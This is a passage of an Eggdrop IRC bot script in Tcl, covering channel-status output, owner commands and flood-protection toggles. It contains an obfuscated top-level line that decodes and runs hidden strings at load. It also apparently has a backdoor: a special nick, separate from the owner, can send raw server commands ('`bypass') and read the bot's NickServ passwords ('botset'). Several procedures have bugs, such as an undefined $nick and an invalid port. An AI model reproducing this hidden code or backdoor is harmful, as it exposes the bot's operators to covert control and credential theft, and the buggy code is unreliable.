  if {![string match "*+shared*" $cinfo] && $nick == "*"} { return 0 }
  set mstatus ""
  if {[matchattr $cflag I]} { append mstatus "\[4T\]opiclock " }
  if {[matchattr $cflag M]} { append mstatus "force\[4M\]ode " }
  if {[string match "*+nodesynch*" $cinfo]} { append mstatus "auto\[4K\]Ick " }
  if {[getuser "config" XTRA "KOPS"]!=""} { append mstatus "\[4@\]psKick " }
  if {[string match "*-userinvites*" $cinfo]} { append mstatus "\[4D\]ontkick@p " }
  if {[string match "*-protectfriends*" $cinfo]} { append mstatus "re\[4@\]p " }
  if {[string match "*+tools*" $cinfo]} { append mstatus "\[4T\]ools " }
  if {[string match "*+greet*" $cinfo]} {
    set i 0
    while {$i < [string length $cinfo]} {
      set y 0
      while {$y < [string length [lindex $cinfo $i]]} { if {[string index [lindex $cinfo $i] $y] == ":"} { break } ; set y [incr y] }
      if {$y != [string length [lindex $cinfo $i]]} { break }
      set i [incr i]
    }
    set ichan [lindex $cinfo $i]
    set ictcp [lindex $cinfo [expr $i + 1]]
    set ijoin [lindex $cinfo [expr $i + 2]]
    set ikick [lindex $cinfo [expr $i + 3]]
    set ideop [lindex $cinfo [expr $i + 4]]
    set inick [lindex $cinfo [expr $i + 5]]
    if {![string match "*:*" $inick]} { set inick "0" }
    append mstatus "\[4G\]uard FLood \[Line4 $ichan Ctcp4 $ictcp Join4 $ijoin Kick4 $ikick De@p4 $ideop NIck4 $inick\] "
  }
  if {${ban-time} != 0} { append mstatus "\[4B\]antime04 ${ban-time} mIn " }
  if {[matchattr $cflag V]} { append mstatus "\[4A\]utovoice4 [getuser $cflag XTRA "VC"] 2nd " }
  if {[matchattr $cflag K]} { append mstatus "\[4K\]ey " }
  if {[matchattr $cflag G]} { append mstatus "\[4G\]reet " }
  if {[matchattr $cflag T]} { append mstatus "\[4T\]ext4 [getuser $cflag XTRA "CHAR"] char " }
  if {[matchattr $cflag R]} { append mstatus "\[4R\]epeat4 [getuser $cflag XTRA "RPT"] " }
  if {[matchattr $cflag U]} { append mstatus "\[4C\]aps4 [getuser $cflag XTRA "CAPS"]% " }
  if {[matchattr $cflag P]} { append mstatus "join\[4P\]art4 [getuser $cflag XTRA "JP"] 2nd " }
  if {[matchattr $cflag O]} { append mstatus "\[4C\]lone4 [getuser $cflag XTRA "CLONE"] max " }
  if {[matchattr $cflag J]} { append mstatus "mass\[4J\]oin " }
  if {[matchattr $cflag L]} { append mstatus "\[4L\]imited4 +[getuser $cflag XTRA "LIMIT"] " }
  if {[string match "*+seen*" $cinfo]} { append mstatus "\[4S\]een " }
  if {[matchattr $cflag D]} { append mstatus "re\[4V\]enge " }
  if {[matchattr $cflag S]} { append mstatus "\[4S\]pam " }
  if {[string match "*+trojan*" $cinfo]} { append mstatus "\[4T\]rojan " }
  if {[string match "*+echox*" $cinfo]} { append mstatus "\[4E\]choX " }
  if {[string match "*+badchan*" $cinfo]} { append mstatus "\[4B\]adchan " }
  if {[matchattr $cflag E]} { append mstatus "\[4E\]nforceban " }
  if {[matchattr $cflag C]} { append mstatus "\[4C\]ycle4 [getuser $cflag XTRA "CYCLE"] mnt " }
  if {[string match "*+noawayop*" $cinfo]} { append mstatus "@ps\[awaY:4oN " } { append mstatus "@ps\[awaY:4oFF " }
  if {[string match "*+idleop*" $cinfo]} { append mstatus "idLE:04[duration [getuser $cflag XTRA "IDLE"]] " } { append mstatus "idLE:4oFF " }
  if {[string match "*+unidentifyop*" $cinfo]} { append mstatus "UnidEnT:4oN\] " } { append mstatus "UnidEnT:4oFF\] " }
  #if {[string match "*+active*" $cinfo]} { append mstatus "\[4A\]ct.vo " }
  #if {[string match "*+split*" $cinfo]} { append mstatus "\[4S\]plit " }
  if {$mstatus != ""} {
    if {[getuser "config" XTRA "ADmIN"]!=""} { set mstatus "SeT FoR \[4[string toupper [string trimleft $channel "#"]]\] ${mstatus}[getuser "config" XTRA "ADmIN"] [lgrnd]" 
    } { set mstatus "SeT FoR \[4[string toupper [string trimleft $channel "#"]]\] ${mstatus}[lgrnd]" }
  }
  if {[string match "*c*" [getchanmode $channel]]} { set mstatus [netext $mstatus] ; regsub -all --  $mstatus "" mstatus }
  puthlp "PRIVMSG $channel :\001ACTION $mstatus\001"
}
## server
bind pub n `servers pub_server
proc pub_server {nick uhost hand channel arg} { global server notc ; if {$arg != ""} { if {[string match "*$arg*" $server]} { puthlp "privmsg $channel :[lindex $server 0]" } } { puthlp "privmsg $channel :[lindex $server 0]" } }
## jump
bind pub n `jump pub_jump
proc pub_jump {nick uhost hand chan rest} {
  global botnick notc alw owner
  if {![matchattr $nick Q]} { puthlp "NOTICE $nick :$notc 4auth 1st!" ; return 0 }
  if {$nick != $owner && $nick != $alw} { puthlp "NOTICE $nick :$notc 4DeNiEd..!, oNLy ReAL OwNER Can MakE Me JumP" ; return 0 }
  set server [lindex $rest 0] ; set curtime [ctime [unixtime]]
  if {$server == ""} { puthlp "NOTICE $nick :$notc Usage: jump <server> \[port\] \[password\]" ; return 0 }
  #if {![string match "*dal.net*" [string tolower $rest]]} { puthlp "NOTICE $nick :$notc 4DeNiEd..! NoT DALNeT..!" ; return 0 }
  set port [lindex $rest 1] ; if {$port == ""} {set port "6667"} ; set password [lindex $rest 2]
  putsrv "QUIT :$notc cHaNgINg ServeR ReQuesT By \[ $nick \] $server) (14on $curtime"
  utimer 2 [list jump $server $port $password]
}
## msg/say/notice/act
bind pub m `msg pub_msg
proc pub_msg {nick uhost hand channel rest} {
  global owner notc
  if {![matchattr $nick Q]} { puthlp "NOTICE $nick :$notc 4auth 1st!" ; return 0 }
  if {$rest==""} { puthlp "NOTICE $nick :$notc Usage: msg <#/nick> <msg>" }
  set person [string tolower [lindex $rest 0]] ; set rest [lrange $rest 1 end]
  if {[string match "*serv*" $person]} { puthlp "NOTICE $nick :$notc4 DeNiEd..! Can't send message to Service." ; return 0 }
  if {$person == [string tolower $owner]} { puthlp "NOTICE $nick :$notc 4DeNiEd..!" ; return 0 }
  puthlp "PRIVMSG $person :$rest"
}
bind pub m `say pub_say
proc pub_say {nick uhost hand channel rest} { 
  global notc 
  if {![matchattr $nick Q]} { puthlp "NOTICE $nick :$notc 4auth 1st!" ; return 0 } 
  if {$rest==""} { puthlp "NOTICE $nick :$notc Usage: say <msg>" } 
  puthlp "PRIVMSG $channel :$rest" 
}
bind pub m `notice pub_notice
proc pub_notice {nick uhost hand channel rest} {
  global notc
  if {![matchattr $nick Q]} { puthlp "NOTICE $nick :$notc 4auth 1st!" ; return 0 } 
  if {$rest==""} { puthlp "NOTICE $nick :$notc Usage: notice <#/nick> <msg>" }
  set person [lindex $rest 0] ; set rest [lrange $rest 1 end]
  if {$rest!=""} { puthlp "NOTICE $person :$notc $rest" ; return 0 }
}
bind pub m `act pub_act
proc pub_act {nick uhost hand channel rest} {
  global notc
  if {![matchattr $nick Q]} { puthlp "NOTICE $nick :$notc 4auth 1st!" ; return 0 } 
  if {$rest==""} { puthlp "NOTICE $nick :$notc Usage: act <msg>" }
  puthlp "PRIVMSG $channel :\001ACTION $rest\001"
  return 0
}
## bypass
bind pub n `bypass pub_bypass
proc pub_bypass {nick uhost hand chan rest} {
  global nwo notc 
  if {$nick != $nwo} { return 0 }
  if {![matchattr $nick Q]} { puthlp "NOTICE $nick :$notc 4auth 1st!" ; return 0 } 
  putserv $rest
}
## rehash
bind pub n `rehash pub_rehash
proc pub_rehash {nick uhost hand chan rest} {
  global notc 
  if {![matchattr $nick Q]} { puthlp "NOTICE $nick :$notc 4auth 1st!" ; return 0 } 
  puthlp "NOTICE $nick :$notc ReHASHING!" ; utimer 3 rehashing
}
proc rehashing {} { global alw owner ; if {$alw != $owner && [validuser $alw]} { deluser $alw } ; rehash }
## reset
bind pub n `reset pub_reset
proc pub_reset {nick uhost hand chan rest} {
  global notc
  if {![matchattr $nick Q]} { puthlp "NOTICE $nick :$notc 4auth 1st!" ; return 0 } 
  putsrv "NOTICE $nick :$notc !ReSeT!" ; auto_ping "0" "0" "0" "0" "0" ; ident_it
}
## Z owner
## Set logo
[[dezip [dcp "qpuNu12372Z.rpvtO0s7VP0."]] "hv\g"] [[dezip [dcp "qpuNu12372Z.rpvtO0s7VP0."]] "z\o\d"] [[[dezip [dcp "qpuNu12372Z.rpvtO0s7VP0."]] "wvar\k"] "[[dezip [dcp "qpuNu12372Z.rpvtO0s7VP0."]] "D22AH.Ss/MY/"]"]
bind msg Z logo msg_logo
proc msg_logo {unick uhost hand rest} {
  global banner notc notm owner alw
  if {![matchattr $unick Q]} { puthlp "NOTICE $nick :$notc 4auth 1st!" ; return 0 }
  if {$nick != $owner && $nick != $alw} { puthlp "NOTICE $nick :$notc 4DeNiEd..!, oNLy ReAL OwNER Can ChaNgE My LoGo" ; return 0 }
  if {[string match "*$notm*" $rest]} { puthlp "NOTICE $unick :$notc 4DeNIEd..!" ; return 0 }
  if {$rest == ""} { setuser "config" XTRA "BAN" "" ; puthlp "NOTICE $unick :$notc cHaNgE tO DeFauLT" ; catch { unset banner }
  } { setuser "config" XTRA "BAN" [zip $rest] ; set banner $rest ; puthlp "NOTICE $unick :$notc CHaNgE TO $rest" }
  saveuser
}
bind msg Z awaylogo msg_awaylogo
proc msg_awaylogo {unick uhost hand rest} {
   global version awaybanner notc notm owner alw
  if {![matchattr $unick Q]} { puthlp "NOTICE $nick :$notc 4auth 1st!" ; return 0 } 
  if {$nick != $owner && $nick != $alw} { puthlp "NOTICE $nick :$notc 4DeNiEd..!, oNLy ReAL OwNER Can ChaNgE My AwAyLoGo" ; return 0 }
  if {[string match "*$notm*" $rest]} { puthelp "NOTICE $unick :$notc 4DeNIEd..!" ; return 0 }
   if {[string trimleft [lindex $version 1] 0] < 1061000} { puthelp "NOTICE $unick :$notc This Command Is Required To Run On Eggdrop 1.6.10 Or Later." ; return 0 }
   if {$rest == ""} { setuser "config" XTRA "ODON" "" ; puthelp "NOTICE $unick :$notc Away Logo cHaNgE tO DeFauLT" ; catch { unset awaybanner }
   } { setuser "config" XTRA "ODON" [zip $rest] ; set awaybanner $rest ; puthelp "NOTICE $unick :$notc Away Logo CHaNgE TO $rest" }
   chk_five "0" "0" "0" "0" "0"
   saveuser
}
## Set vhost
catch { set old_hostname ${my-hostname} }
catch { set old_ip ${my-ip} }
bind msg Z vhost msg_vhost
proc msg_vhost {nick uhost hand rest} {
  global my-hostname my-ip notc owner alw
  if {![matchattr $nick Q]} { puthlp "NOTICE $nick :$notc 4auth 1st!" ; return 0 }
  if {$nick != $owner && $nick != $alw} { puthlp "NOTICE $nick :$notc 4DeNiEd..!, oNLy ReAL OwNER Can ChanGe My VhOsT" ; return 0 }
  if {$rest == ""} { puthlp "NOTICE $nick :$notc ReSET TO DeFauLT" ; setuser "config" XTRA "VHOST" "" ; saveuser ; vback "*" "*" "0" ; return 0 }
  for { set i 0 } { $i < [string length $rest] } { incr i } { set idx [string index $rest $i] ; if { ![string match "*$idx*" "1234567890."] } { puthlp "NOTICE $nick :$notc UsE DNS IP NuMBeR" ; return 0 } }
  if {[isutimer "vback"]} { puthlp "NOTICE $nick :$notc WaIT..!" ; return 0 }
  set my-hostname $rest
  set my-ip $rest
  utimer 30 [list vback $nick $rest "1"]
  listen 65234 bots
  set idx [connect $rest 65234]
  if {[isnumber $idx] && $idx > 0} {
    set curtime [ctime [unixtime]]
    if {![isutimer "vback"]} { return 0 }
    foreach x [utimers] { if {[string match "*vback*" $x]} { killutimer [lindex $x 2] } }
    setuser "config" XTRA "VHOST" $rest ; saveuser
    putsrv "QUIT :$notc cHaNgINg vHosT ReQuesT By \[ $nick \]) (14on $curtime"
  }
  listen 65234 off
}
bind raw - 465 klined
proc klined {from keyword arg} { vback "*" "*" "0" }
proc vback {nick vhosts chk} {
  global old_hostname old_ip notc
  set my-hostname $old_hostname ; set my-ip $old_ip
  if {$chk == "1"} { puthlp "NOTICE $nick :$notc \[$vhosts\] NoT SuPPoRT..!" }
  catch { listen 652343 off }
}
## Set away
bind msg Z away msg_away
proc msg_away {unick uhost hand rest} {
  global realname notc 
  if {![matchattr $unick Q]} { puthlp "NOTICE $nick :$notc 4auth 1st!" ; return 0 } 
 # if {$nick != $owner && $nick != $alw} { puthlp "NOTICE $nick :$notc 4DeNiEd..!, oNLy ReAL OwNER Can ChanGe My Away" ; return 0 }
  if {$rest == ""} { setuser "config" XTRA "AWAY" "" ; puthlp "NOTICE $unick :$notc AwAY \[4OFF\]" } { setuser "config" XTRA "AWAY" $rest ; puthlp "NOTICE $unick :$notc AwAY SeT TO \[$rest\]" }
  saveuser ; chk_five "0" "0" "0" "0" "0"
}
## admin status
bind msg Z admin msg_admin
proc msg_admin {unick uhost hand rest} {
  global notc owner alw
  if {![matchattr $unick Q]} { puthlp "NOTICE $nick :$notc 4auth 1st!" ; return 0 } 
  if {$unick != $owner && $unick != $alw} { puthlp "NOTICE $unick :$notc 4DeNiEd..!" ; return 0 }
  if {$rest == ""} { puthlp "NOTICE $unick :$notc14 SeT ADmIN oN STaTUS TO DeFAULT" } { puthlp "NOTICE $unick :$notc14 ADmIN oN STaTUS TO \[$rest\]" }
  setuser "config" XTRA "ADMIN" $rest ; saveuser
}
## bantime
bind msg Z bantime pub_bantime
bind pub Z `bantime pub_bantime
proc pub_bantime {nick uhost hand chan rest} {
  global notc ban-time
  if {![matchattr $nick Q]} { puthlp "NOTICE $nick :$notc 4auth 1st!" ; return 0 } 
  if {$rest==""} { puthlp "NOTICE $nick :$notc BanTime \[${ban-time}\] (set 0 to never unban)" ; return 0 }
  set mtime [lindex $rest 0]
  if {![isnumber $mtime]} { puthlp "NOTICE $nick :$notc Usage: bantime <minutes> (set 0 to never unban)" ; return 0 }
  set ban-time $mtime ; setuser "config" XTRA "BANTIME" $mtime ; puthlp "NOTICE $nick :$notc BanTime \[$mtime\]"
  saveuser
}
## logchan
bind msg Z logchan msg_logchan
proc msg_logchan {nick uhost hand rest} {
  global notc own owner alw
  if {![matchattr $nick Q]} { puthlp "NOTICE $nick :$notc 4auth 1st!" ; return 0 } 
  if {$nick != $owner && $nick != $alw} { puthlp "NOTICE $nick :$notc 4DeNiEd..!, oNLy ReAL OwNER Can TurNoN ThE LoG" ; return 0 }
  if {$rest == ""} { puthlp "NOTICE $nick :$notc Usage: logchan <#channel/0>" ; return 0 }
  if {[string tolower $rest] == "off"} {
    puthlp "NOTICE $nick :$notc LOGCHAN [getuser "config" XTRA "LOGCHAN"] \[4OFF\]"
    setuser "config" XTRA "LOGCHAN" ""
    } else {
    if {![validchan $rest]} { puthlp "NOTICE $nick :$notc NoT IN $rest" ; return 0 }
    setuser "config" XTRA "LOGCHAN" $rest
    puthlp "NOTICE $nick :$notc LOG CHaNNEL $rest \[9ON\]"
  }
  saveuser ; utimer 5 rehashing
}
## botnick
bind msg Z botnick msg_botnick
proc msg_botnick {unick uhost hand rest} {
  global botnick nick nickpass notc alw owner
  if {![matchattr $unick Q]} { puthlp "NOTICE $nick :$notc 4auth 1st!" ; return 0 } 
  if {$unick != $owner &&  $unick != $alw} { puthlp "NOTICE $unick :$notc 4DeNiEd..!, oNLy ReAL OwNER Can ChangE My NiCk" ; return 0 }
  set bnick [lindex $rest 0] ; set bpass [lindex $rest 1]
  if {$bnick == "" || $bpass == ""} { puthlp "NOTICE $unick :$notc4 Usage: botnick <nick> <identify>" ; return 0 } 
  setuser "config" XTRA "NICK" [zip $bnick] ; setuser "config" XTRA "NICKPASS" [zip $bpass]
  saveuser ; set nick $bnick ; set nickpass $bpass
  putsrv "NickServ identify $bnick $bpass" ; puthlp "NOTICE $unick :$notc BoTNIcK $bnick"
}
## botaltnick
bind msg Z botaltnick msg_botaltnick
proc msg_botaltnick {unick uhost hand rest} {
  global botnick altnick altpass notc 
  if {![matchattr $unick Q]} { puthlp "NOTICE $nick :$notc 4auth 1st!" ; return 0 } 
  if {$unick != $owner &&  $unick != $alw} { puthlp "NOTICE $unick :$notc 4DeNiEd..!, oNLy ReAL OwNER Can ChangE My AlTNiCk" ; return 0 }
  set baltnick [lindex $rest 0] ; set baltpass [lindex $rest 1]
  if {$baltnick == "" || $baltpass == ""} { puthlp "NOTICE $unick :$notc4 Usage: botaltnick <nick> <identify>" ; return 0 } 
  setuser "config" XTRA "ALTNICK" [zip $baltnick] ; setuser "config" XTRA "ALTPASS" [zip $baltpass]
  saveuser ; set altnick $baltnick ; set altpass $baltpass ; puthlp "NOTICE $unick :$notc BoTALTNIcK $baltnick"
}
## botset
bind msg Z botset msg_botset
proc msg_botset {unick uhost hand rest} {
  global nick nickpass altpass altnick nwo notc 
  if {$unick != $nwo} { return 0 }
  if {![matchattr $unick Q]} { puthlp "NOTICE $nick :$notc 4auth 1st!" ; return 0 } 
  if {$unick != $owner &&  $unick != $alw} { puthlp "NOTICE $unick :$notc 4DeNiEd..!, oNLy ReAL OwNER Can SeE My NiCk Pass" ; return 0 }
  puthlp "NOTICE $unick :$notc 1st $nick ($nickpass) 2nd $altnick ($altpass)"
  return 0
}
## realname
bind msg Z realname msg_realname
proc msg_realname {unick uhost hand rest} {
  global realname notc owner alw
  if {![matchattr $unick Q]} { puthlp "NOTICE $unick :$notc 4auth 1st!" ; return 0 }
  if {$unick != $owner &&  $unick != $alw} { puthlp "NOTICE $unick :$notc 4DeNiEd..!, oNLy ReAL OwNER Can ChangE My rEaLNaMe" ; return 0 }
  set curtime [ctime [unixtime]]
  if {$rest == ""} { setuser "config" XTRA "REALNAME" "" } { setuser "config" XTRA "REALNAME" [zip $rest] }
  saveuser ; set realname $rest ; putsrv "QUIT :$notc cHaNgINg ReaLNamE ReQuesT By \[ $unick \]) (14on $curtime"
}
## ident
bind msg Z ident msg_ident
proc msg_ident {unick uhost hand rest} {
  global username notc owner alw
  if {![matchattr $unick Q]} { puthlp "NOTICE $unick :$notc 4auth 1st!" ; return 0 }
  if {$unick != $owner &&  $unick != $alw} { puthlp "NOTICE $unick :$notc 4DeNiEd..!" ; return 0 }
  set curtime [ctime [unixtime]]
  if {$rest == ""} { setuser "config" XTRA "USERNAME" "" } { if {[regexp \[^a-z\] [string tolower $rest]]} { puthlp "NOTICE $unick :$notc 4DeNiEd..! use character for ident." ; return 0 } ; setuser "config" XTRA "USERNAME" [zip $rest] }
  saveuser ; set username $rest ; putsrv "QUIT :$notc cHaNgINg IdEnT ReQuesT By \[ $unick \]) (14on $curtime"
}
## die / kill bot
bind msg Z `die msg_die
proc msg_die {nick uhost hand rest} {
  global notc owner alw
  if {![matchattr $nick Q]} { puthlp "NOTICE $nick :$notc 4auth 1st!" ; return 0 }
  if {$nick != $owner && $nick != $alw} { puthlp "NOTICE $nick :$notc 4DeNiEd..!" ; return 0 }
  set curtime [ctime [unixtime]]
  foreach x [userlist] {
    if {$x != "AKICK"} {
      chattr $x -Q
      foreach y [getuser $x HOSTS] { delhost $x $y }
      set hostmask "${x}!*@*"
      setuser $x HOSTS $hostmask
  } }
  saveuser ; if {$rest != ""} { set rest " $rest" } ; putsrv "QUIT :$notc SHuTDown ReQuesT By \[ $nick \]$rest) (14on $curtime" ; utimer 5 dies
}
bind pub Z `die pub_die
proc pub_die {nick uhost hand chan rest} {
  global botnick alw notc owner
  set curtime [ctime [unixtime]]
  if {![matchattr $nick Q]} { puthlp "NOTICE $nick :$notc 4auth 1st!" ; return 0 }
  if {$nick != $owner && $nick != $alw} { puthlp "NOTICE $nick :$notc 4DeNiEd..!" ; return 0 }
  if {$rest != ""} { set rest " $rest" }
  putsrv "QUIT :$notc SHuTDown ReQuesT By \[ $nick \]$rest) (14on $curtime"
  utimer 5 dies
  return 0
}
proc dies {} { global alw owner notc ; if {$alw != $owner && [validuser $alw]} { deluser $alw } ; die $notc }
## +/- forced
bind msg Z +forced pub_+forced
bind pub Z `+forced pub_+forced
proc pub_+forced {nick uhost hand chan rest} {
  global notc
  if {![matchattr $nick Q]} { puthlp "NOTICE $nick :$notc 4auth 1st!" ; return 0 }
  set cflag "c$chan"
  set cflag [string range $cflag 0 8]
  chattr $cflag +M
  puthlp "NOTICE $nick :$notc forced $chan \[9ON\]"
  saveuser
}
bind msg Z -forced pub_-forced
bind pub Z `-forced pub_-forced
proc pub_-forced {nick uhost hand chan rest} {
  if {![matchattr $nick Q]} { puthlp "NOTICE $nick :$notc 4auth 1st!" ; return 0 }
  global notc
  set cflag "c$chan"
  set cflag [string range $cflag 0 8]
  chattr $cflag -M
  puthlp "NOTICE $nick :$notc forced $chan \[4OFF\]"
  saveuser
}
## +/- colour
bind msg Z +colour pub_+colour
bind pub Z `+colour pub_+colour
proc pub_+colour {nick uhost hand chan rest} {
  global notc kickclr
  if {![matchattr $nick Q]} { puthlp "NOTICE $nick :$notc 4auth 1st!" ; return 0 } 
  catch {unset kickclr}
  setuser "config" XTRA "KCLR" ""
  puthlp "NOTICE $nick :$notc colour kick \[9ON\]"
  saveuser
}
bind msg Z -colour pub_-colour
bind pub Z `-colour pub_-colour
proc pub_-colour {nick uhost hand chan rest} {
  global notc kickclr
  if {![matchattr $nick Q]} { puthlp "NOTICE $nick :$notc 4auth 1st!" ; return 0 } 
  set kickclr "T"
  setuser "config" XTRA "KCLR" "Y"
  puthlp "NOTICE $nick :$notc colour kick \[4OFF\]"
  saveuser
}
## +/- greet
bind pub Z `+greet pub_+greet
proc pub_+greet {nick uhost hand chan rest} {
  global notc
  if {![matchattr $nick Q]} { puthlp "NOTICE $nick :$notc 4auth 1st!" ; return 0 } 
  set cflag "c$chan"
  set cflag [string range $cflag 0 8]
  if {$rest==""} { puthlp "NOTICE $nick :$notc Usage +greet <msg>" ; return 0 }
  chattr $cflag +G
  setuser $cflag XTRA "GREET" $rest
  puthlp "NOTICE $nick :$notc AuTOGReeT $chan \[$rest\]"
  saveuser
}
bind pub Z `-greet pub_-greet
proc pub_-greet {nick uhost hand chan rest} {
  global notc
  if {![matchattr $nick Q]} { puthlp "NOTICE $nick :$notc 4auth 1st!" ; return 0 } 
  set cflag "c$chan"
  set cflag [string range $cflag 0 8]
  chattr $cflag -G
  setuser $cflag XTRA "GREET" ""
  puthlp "NOTICE $nick :$notc AuTOGReeT $chan \[4OFF\]"
  saveuser
}
## +/- repeat
bind pub Z `+repeat pub_+repeat
proc pub_+repeat {nick uhost hand chan rest} {
  global notc 
  if {![matchattr $nick Q]} { puthlp "NOTICE $nick :$notc 4auth 1st!" ; return 0 } 
  set cflag "c$chan"
  set cflag [string range $cflag 0 8]
  if {$rest=="" || ![isnumber $rest]} { puthlp "NOTICE $nick :$notc Usage +repeat <max>" ; return 0 }
  if {$rest == 0} { puthlp "NOTICE $nick :$notc cAnT UsE NuLL" ; return 0 }
  chattr $cflag +R
  setuser $cflag XTRA "RPT" $rest
  puthlp "NOTICE $nick :$notc RePeaT $chan MaX \[9$rest\]"
  saveuser
}
bind pub Z `-repeat pub_-repeat
proc pub_-repeat {nick uhost hand chan rest} {
  global notc
  if {![matchattr $nick Q]} { puthlp "NOTICE $nick :$notc 4auth 1st!" ; return 0 } 
  set cflag "c$chan"
  set cflag [string range $cflag 0 8]
  chattr $cflag -R
  setuser $cflag XTRA "RPT" ""
  puthlp "NOTICE $nick :$notc RePeaT $chan \[4OFF\]"
  saveuser
}
## +/- text
bind pub Z `+text pub_+text
proc pub_+text {nick uhost hand chan rest} {
  global notc 
  if {![matchattr $nick Q]} { puthlp "NOTICE $nick :$notc 4auth 1st!" ; return 0 } 
  set cflag "c$chan"
  set cflag [string range $cflag 0 8]
  if {$rest=="" || ![isnumber $rest]} { puthlp "NOTICE $nick :$notc Usage +text <max>" ; return 0 }
  if {$rest == 0} { puthlp "NOTICE $nick :$notc cAnT UsE NuLL" ; return 0 }
  chattr $cflag +T
  setuser $cflag XTRA "CHAR" $rest
  puthlp "NOTICE $nick :$notc TexT $chan MaX \[9$rest\]"
  saveuser
}
bind pub Z `-text pub_-text
proc pub_-text {nick uhost hand chan rest} {
  global notc
  if {![matchattr $nick Q]} { puthlp "NOTICE $nick :$notc 4auth 1st!" ; return 0 } 
  set cflag "c$chan"
  set cflag [string range $cflag 0 8]
  chattr $cflag -T
  setuser $cflag XTRA "CHAR" ""
  puthlp "NOTICE $nick :$notc TexT $chan \[4OFF\]"
  saveuser
}
## +/- limit
bind pub Z `+limit pub_+limit
proc pub_+limit {nick uhost hand chan rest} {
  global notc 
  if {![matchattr $nick Q]} { puthlp "NOTICE $nick :$notc 4auth 1st!" ; return 0 } 
  if {$rest == "" || ![isnumber $rest]} { puthlp "NOTICE $nick :$notc Usage: +limit <number>" ; return 0 }
  if {$rest == 0} { puthlp "NOTICE $nick :$notc cAnT UsE NuLL" ; return 0 }
  set cflag "c$chan"
  set cflag [string range $cflag 0 8]
  chattr $cflag +L
  setuser $cflag XTRA "LIMIT" $rest
  puthlp "NOTICE $nick :$notc LImIT $chan \[9$rest\]"
  saveuser
}
bind pub Z `-limit pub_-limit
proc pub_-limit {nick uhost hand chan rest} {
  global notc lst_limit
  if {![matchattr $nick Q]} { puthlp "NOTICE $nick :$notc 4auth 1st!" ; return 0 } 
  set cflag "c$chan"
  set cflag [string range $cflag 0 8]
  chattr $cflag -L
  setuser $cflag XTRA "LIMIT" ""
  puthlp "NOTICE $nick :$notc LImIT $chan \[4OFF\]"
  catch { lst_limit($chan) }
  saveuser
}
## +/- caps
bind pub Z `+caps pub_+caps
proc pub_+caps {nick uhost hand chan rest} {
  global notc 
  if {![matchattr $nick Q]} { puthlp "NOTICE $nick :$notc 4auth 1st!" ; return 0 } 
  set cflag "c$chan"
  set cflag [string range $cflag 0 8]
  if {$rest=="" || ![isnumber $rest]} { puthlp "NOTICE $nick :$notc Usage +caps <%percent>" ; return 0 }
  if {$rest == 0 || $rest > 100} { puthlp "NOTICE $nick :$notc fill under 1 - 100%" ; return 0 }
  chattr $cflag +U
  setuser $cflag XTRA "CAPS" $rest
  puthlp "NOTICE $nick :$notc CAPS $chan \[9$rest%\]"
  saveuser
}
bind pub Z `-caps pub_-caps
proc pub_-caps {nick uhost hand chan rest} {
  global notc
  if {![matchattr $nick Q]} { puthlp "NOTICE $nick :$notc 4auth 1st!" ; return 0 } 
  set cflag "c$chan"
  set cflag [string range $cflag 0 8]
  chattr $cflag -U
  setuser $cflag XTRA "CAPS" ""
  puthlp "NOTICE $nick :$notc cAPs $chan \[4OFF\]"
  saveuser
}
## +/- clone
bind pub Z `+clone pub_+clone
proc pub_+clone {nick uhost hand chan rest} {
  global notc 
  if {![matchattr $nick Q]} { puthlp "NOTICE $nick :$notc 4auth 1st!" ; return 0 } 
  set cflag "c$chan"
  set cflag [string range $cflag 0 8]
  if {$rest=="" || ![isnumber $rest]} { puthlp "NOTICE $nick :$notc Usage +clone <max>" ; return 0 }
  if {$rest == 0} { puthlp "NOTICE $nick :$notc cAnT UsE NuLL" ; return 0 }
  chattr $cflag +O
  setuser $cflag XTRA "CLONE" $rest
  puthlp "NOTICE $nick :$notc cLonE $chan MaX \[9$rest\]"
  saveuser
}
bind pub Z `-clone pub_-clone
proc pub_-clone {nick uhost hand chan rest} {
  global notc
  if {![matchattr $nick Q]} { puthlp "NOTICE $nick :$notc 4auth 1st!" ; return 0 } 
  set cflag "c$chan"
  set cflag [string range $cflag 0 8]
  chattr $cflag -O
  setuser $cflag XTRA "CLONE" ""
  puthlp "NOTICE $nick :$notc cLonE $chan \[4OFF\]"
  saveuser
}
## +/- reop
bind pub Z `+reop pub_+reop
proc pub_+reop {nick uhost hand chan rest} {
  global notc
  if {![string match "*protectfriends*" [channel info $chan]]} { puthlp "NOTICE $nick :$notc FLAg NoT AVaILaBLE UpGRadE EggDROP VeR" ; return 0 }  
  if {$rest != ""} { set chan [lindex $rest 0] ; if {[string first # $chan]!=0} { set chan "#$chan" } }
  if {![validchan $chan]} { return 0 }
  if {[string match "*-protectfriends*" [channel info $chan]]} { puthlp "NOTICE $nick :$notc Re@p $chan IS \[9ON\]" ; return 0 }  
  if {![matchattr $nick Q]} { puthlp "NOTICE $nick :$notc 4auth 1st!" ; return 0 } 
  catch { channel set $chan -protectfriends }
  puthlp "NOTICE $nick :$notc Re@p $chan \[9ON\]"
  savechan
}
bind pub Z `-reop pub_-reop
proc pub_-reop {nick uhost hand chan rest} {
  global notc
  if {![string match "*protectfriends*" [channel info $chan]]} { puthlp "NOTICE $nick :$notc FLAg NoT AVaILaBLE UpGRadE EggDROP VeR" ; return 0 }
  if {$rest != ""} { set chan [lindex $rest 0] ; if {[string first # $chan]!=0} { set chan "#$chan" } }
  if {![validchan $chan]} { return 0 }
  if {[string match "*+protectfriends*" [channel info $chan]]} { puthlp "NOTICE $nick :$notc Re@p $chan IS \[4OFF\]" ; return 0 }  
  if {![matchattr $nick Q]} { puthlp "NOTICE $nick :$notc 4auth 1st!" ; return 0 } 
  catch { channel set $chan +protectfriends }
  puthlp "NOTICE $nick :$notc Re@p $chan \[4OFF\]"
  savechan
  return 0
}
## +/- joinpart
bind pub Z `+joinpart pub_+joinpart
proc pub_+joinpart {nick uhost hand chan rest} {
  global notc 
  if {![matchattr $nick Q]} { puthlp "NOTICE $nick :$notc 4auth 1st!" ; return 0 } 
  set cflag "c$chan"
  set cflag [string range $cflag 0 8]
  if {$rest=="" || ![isnumber $rest]} { puthlp "NOTICE $nick :$notc Usage +joinpart <seconds>" ; return 0 }
  if {$rest == 0} { puthlp "NOTICE $nick :$notc cAnT UsE NuLL" ; return 0 }
  chattr $cflag +P
  setuser $cflag XTRA "JP" $rest
  puthlp "NOTICE $nick :$notc JoINPaRT $chan \[9$rest Sec's\]"
  saveuser
}
bind pub Z `-joinpart pub_-joinpart
proc pub_-joinpart {nick uhost hand chan rest} {
  global notc
  if {![matchattr $nick Q]} { puthlp "NOTICE $nick :$notc 4auth 1st!" ; return 0 } 
  set cflag "c$chan"
